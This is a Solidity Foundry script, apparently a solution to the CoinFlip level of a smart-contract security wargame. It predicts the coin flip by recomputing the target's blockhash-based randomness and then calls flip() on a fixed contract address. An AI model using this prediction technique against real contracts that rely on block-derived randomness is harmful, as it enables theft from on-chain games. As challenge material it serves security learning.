// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
//import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";
import "../src/levels/03-CoinFlip/CoinFlip.sol";
import "openzeppelin-contracts/utils/math/SafeMath.sol";

contract ExploitScript is Script {
    using SafeMath for uint256;
    CoinFlip level3 = CoinFlip(payable(0x50e3bbf17a0A556DA3DA66129aD5c3aDF8683a10));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        console.log("blockValue",blockValue);
        console.log("coinFlip",blockValue);
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            level3.flip(true);
        } else {
            level3.flip(false);
        }
            
        console.log("Consecutive Wins: ", level3.consecutiveWins());

        vm.stopBroadcast();
    }
}